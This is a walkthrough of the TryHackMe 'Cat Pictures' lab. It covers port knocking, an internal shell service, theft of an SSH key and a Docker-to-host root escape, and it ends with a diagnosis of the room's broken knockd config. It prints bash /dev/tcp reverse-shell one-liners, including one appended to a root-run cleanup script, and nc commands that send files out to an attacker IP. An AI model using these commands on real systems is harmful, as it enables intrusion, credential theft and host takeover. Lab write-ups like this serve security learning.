# Cat Pictures

I made a forum where you can post cute cat pictures!

Room: https://tryhackme.com/room/catpictures

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/catpictures.md

## Summary

This room starts with a small phpBB forum that gives a port knocking hint. The intended route is to use the knock sequence to open FTP, retrieve a note, connect to an internal shell service, get a proper reverse shell, run a helper binary, SSH into a Docker container, and then escape to host root through a writable cleanup script.

During testing, the port knocking step did not work correctly. After a lot of troubleshooting, I checked the TryHackMe Discord and found other people reporting similar issues. To continue the room, I used a walkthrough to get past the broken FTP step. Later, after getting root, I confirmed why the knock was broken, fixed the room locally, and lodged a bug report to TryHackMe with the cause and fix.

Flags are masked in this writeup.

---

## Initial Enumeration

I started with a full TCP scan.

```bash
nmap -sV -p- 10.65.163.227
```

The first scans showed SSH, FTP filtered, and Docker filtered.

```text
21/tcp   filtered ftp
22/tcp   open     ssh
2375/tcp filtered docker
```

A more targeted scan against the expected ports showed the useful services.

```bash
nmap -Pn -sV -sC -p21,22,53,8080,4420,2375,2376 10.65.163.227
```

Important findings:

```text
21/tcp   filtered ftp
22/tcp   open     ssh
2375/tcp filtered docker
4420/tcp open     internal shell service
8080/tcp open     http Apache httpd 2.4.46 PHP 7.3.27
```

Port `8080` hosted a phpBB forum called Cat Pictures.

Port `4420` exposed an internal shell service.

---

## Web Enumeration

I opened the web app on port `8080`.

```text
http://10.65.163.227:8080
```

The forum had a post saying:

```text
POST ALL YOUR CAT PICTURES HERE :)

Knock knock! Magic numbers: 1111, 2222, 3333, 4444
```

This clearly pointed to port knocking.

I also checked the phpBB version from the style config.

```bash
curl -s http://10.65.163.227:8080/styles/prosilver/style.cfg
```

Version found:

```text
style_version = 3.3.3
phpbb_version = 3.3.3
```

I briefly looked at possible phpBB CVEs, but there was no obvious unauthenticated RCE path for this version. The forum looked more like a hint delivery mechanism than the main exploit path.

---

## Port Knocking Issue

The expected knock sequence was:

```bash
knock -v 10.65.163.227 1111 2222 3333 4444
```

Then FTP should have opened.

```bash
nc -nv 10.65.163.227 21
```

Expected:

```text
220 vsFTPd 3.0.5
```

However, FTP did not open during normal testing.

I tried multiple methods:

```bash
knock -v 10.65.163.227 1111 2222 3333 4444
```

```bash
knock -u -v 10.65.163.227 1111 2222 3333 4444
```

```bash
for p in 1111 2222 3333 4444; do
  nc -z -w1 10.65.163.227 $p
  sleep 1
done
```

I also tried different timings and immediate FTP checks, but FTP still did not open.

At this point it felt like something was wrong with the room rather than my commands. I checked the TryHackMe Discord and found other users reporting similar issues with this room. To keep moving, I used a walkthrough to get the missing FTP note information.

The FTP note would have pointed to the internal shell service on port `4420` and given the password.

Internal shell password masked:

```text
sard...cat
```

---

## Internal Shell on Port 4420

I connected to the internal shell service.

```bash
nc -nv 10.65.163.227 4420
```

The service displayed:

```text
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment
Please enter password:
```

I entered the password from the walkthrough.

```text
sardinethecat
```

This gave access to a restricted internal shell.

Important note: `cd` does not work properly in this shell, so I used full paths.

---

## Getting a Proper Reverse Shell

The helper binary does not work inside the internal shell.

```bash
/home/catlover/runme
```

Output:

```text
THIS EXECUTABLE DOES NOT WORK UNDER THE INTERNAL SHELL, YOU NEED A REGULAR SHELL.
```

So I started a listener on my AttackBox.

```bash
nc -lvnp 9001
```

From the internal shell, I sent a reverse shell back to my AttackBox.

```bash
bash -c 'bash -i >& /dev/tcp/10.65.86.100/9001 0>&1'
```

This gave a better shell as the `catlover` context.

---

## Analysing and Running `runme`

Inside `/home/catlover`, there was a binary called `runme`.

The target environment was minimal, and tools like `file` and `strings` were not available in some shells.

```bash
file /home/catlover/runme
```

```text
bash: file: command not found
```

```bash
strings /home/catlover/runme
```

```text
bash: strings: command not found
```

In a normal workflow, I would copy the binary back to the AttackBox and run `strings` there.

Example transfer using `nc`:

On the AttackBox:

```bash
nc -lvnp 9001 > runme
```

On the target:

```bash
cat /home/catlover/runme | nc 10.65.86.100 9001
```

Then on the AttackBox:

```bash
file runme
strings runme | less
```

The password for `runme` can be found by static analysis of the binary.

Password masked:

```text
reb...cca
```

I then ran the binary:

```bash
/home/catlover/runme
```

Entered the password:

```text
reb...cca
```

It accepted the password and queued an SSH key transfer.

```text
Welcome, catlover! SSH key transfer queued!
```

The key was written to:

```text
/home/catlover/id_rsa
```

---

## Copying the SSH Key

I copied the key back to the AttackBox using `nc`.

On the AttackBox:

```bash
nc -lvnp 9001 > id_rsa
```

On the target:

```bash
cat /home/catlover/id_rsa | nc 10.65.86.100 9001
```

Then I fixed permissions on the AttackBox:

```bash
chmod 600 id_rsa
```

At first I expected this key to connect back to the target host as `catlover`, but that was a mistake.

The SSH key connects to a Docker container running on the target, not to the target host itself.

```bash
ssh -i id_rsa catlover@10.65.163.227
```

The prompt showed a Docker container ID.

```text
root@7546fa2336d6:/#
```

I confirmed this with:

```bash
cat /proc/1/cgroup
```

The output contained Docker paths.

```text
/docker/7546fa2336d6...
```

---

## First Flag

Inside the Docker container, I found the first flag at:

```bash
cat /root/flag.txt
```

Flag masked:

```text
7cf90a...63cca9
```

This is the first flag, even though it is located in `/root` inside the container.

---

## Docker Container to Host Root

I initially checked for common Docker escape paths.

```bash
ls -la /var/run/docker.sock
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

This did not work.

```text
ls: cannot access '/var/run/docker.sock': No such file or directory
bash: docker: command not found
```

The intended path was a writable cleanup script.

I checked:

```bash
ls -la /opt/clean
cat /opt/clean/clean.sh
```

The script was writable from inside the container and was executed by a host-side cleanup job.

On the AttackBox, I started a listener:

```bash
nc -lvnp 9002
```

Inside the Docker container, I appended a reverse shell to the cleanup script.

```bash
echo 'bash -i >& /dev/tcp/10.65.86.100/9002 0>&1' >> /opt/clean/clean.sh
```

After waiting for the cleanup job to run, I caught a root shell on the host.

I confirmed host root:

```bash
id
hostname
```

Then I read the final flag.

```bash
cat /root/root.txt
```

Final flag masked:

```text
4a98e4...3f0476
```

---

## Investigating the Broken Port Knock

After getting root, I investigated why FTP did not open after knocking.

The live firewall rules showed that port `21` was rejected.

```bash
iptables -L INPUT -n -v --line-numbers
```

Relevant rules:

```text
REJECT tcp dpt:2375 reject-with icmp-port-unreachable
REJECT tcp dpt:21 reject-with icmp-port-unreachable
REJECT tcp dpt:8080 reject-with icmp-port-unreachable
REJECT tcp dpt:21 reject-with icmp-port-unreachable
```

FTP itself was running.

```bash
ss -lntup | grep ':21'
```

Output:

```text
*:21 users:(("vsftpd",pid=722,fd=3))
```

So FTP was not down. The firewall was blocking access.

I checked `knockd`.

```bash
ps aux | grep -i knock
```

Output:

```text
/usr/sbin/knockd -i eth0
```

The interface was correct.

```bash
ip -br a
```

Output showed:

```text
eth0 UP 10.65.163.227/18
```

Then I checked the `knockd` config.

```bash
cat /etc/knockd.conf
```

The `openFTP` section was:

```text
[openFTP]
sequence = 1111,2222,3333,4444
seq_timeout = 15
command = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 21 -j ACCEPT && iptables -D INPUT -p tcp --dport 21 -j REJECT
tcpflags = syn
```

The sequence was correct, but the command had issues.

I checked the knock logs.

```bash
grep -i knock /var/log/syslog | tail -50
```

The logs showed that the sequence was being detected.

```text
openFTP: Stage 1
openFTP: Stage 2
openFTP: Stage 3
openFTP: Stage 4
openFTP: OPEN SESAME
```

But then the command failed.

```text
running command: /sbin/iptables ...
sh: 1: /sbin/iptables: not found
command returned non-zero status code 127
```

I checked the real `iptables` path.

```bash
command -v iptables
```

Output:

```text
/usr/sbin/iptables
```

So the room was configured to use:

```text
/sbin/iptables
```

but the actual binary was at:

```text
/usr/sbin/iptables
```

There was also a rule ordering problem. The original command used `-A INPUT`, which appends the ACCEPT rule at the bottom of the chain. Since there were already REJECT rules for port `21`, an appended ACCEPT rule could still sit below a REJECT and never be reached.

---

## Fixing the Room Locally

I fixed the `knockd` command by changing the path and inserting the ACCEPT rule above the FTP rejects.

Working command:

```text
command = /usr/sbin/iptables -I INPUT 3 -s %IP% -p tcp --dport 21 -j ACCEPT
```

Single command fix as root:

```bash
cp /etc/knockd.conf /etc/knockd.conf.bak && sed -i 's|/sbin/iptables|/usr/sbin/iptables|g; s|-A INPUT -s %IP% -p tcp --dport 21 -j ACCEPT && iptables -D INPUT -p tcp --dport 21 -j REJECT|-I INPUT 3 -s %IP% -p tcp --dport 21 -j ACCEPT|g' /etc/knockd.conf && pkill knockd; /usr/sbin/knockd -i eth0 -d
```

Then I tested from the AttackBox:

```bash
knock -v 10.65.163.227 1111 2222 3333 4444
nc -nv 10.65.163.227 21
```

This worked.

```text
Connection to 10.65.163.227 21 port succeeded
220 vsFTPd 3.0.5
```

That confirmed the original issue.

---

## Getting the FTP Note After Fixing Knock

After fixing the knock issue, FTP became reachable.

```bash
nc -nv 10.65.163.227 21
```

Output:

```text
220 vsFTPd 3.0.5
```

Using raw `nc`, I initially tried:

```text
list
```

But that failed because raw FTP protocol commands are not the same as the FTP client commands.

```text
530 Please login with USER and PASS.
```

After logging in, raw commands like `ls` still did not work because FTP listing requires proper FTP protocol handling and a data connection.

The correct way is to use the FTP client:

```bash
ftp 10.65.163.227
```

Login:

```text
anonymous
anonymous
```

Then:

```text
ls
get note.txt
bye
```

Or one-shot:

```bash
ftp -inv 10.65.163.227 << 'EOF'
user anonymous anonymous
binary
passive
ls
get note.txt
bye
EOF

cat note.txt
```

---

## Bug Report Submitted to TryHackMe

https://discordapp.com/channels/521382216299839518/1512424115628282059/1512424115628282059

---

## Lessons Learned

When a room step feels broken, verify the expected behaviour with multiple methods before assuming user error.

Port knocking can fail even when the sequence is correct if the daemon command is broken.

Checking logs is the fastest way to confirm whether `knockd` detects the sequence.

Firewall rule order matters. An ACCEPT rule below a REJECT rule may never be reached.

Do not assume an SSH key lands on the host. In this room, the key landed inside a Docker container.

Minimal shells can lack tools like `file`, `strings`, `which`, `uname`, and even `/dev/null`.

When tooling is missing on the target, copy files back to the AttackBox and analyse them locally.

Writable scripts executed by root or host-side jobs are high-value privilege escalation paths.

Documenting broken room behaviour is useful, especially when the issue can be reproduced and fixed.
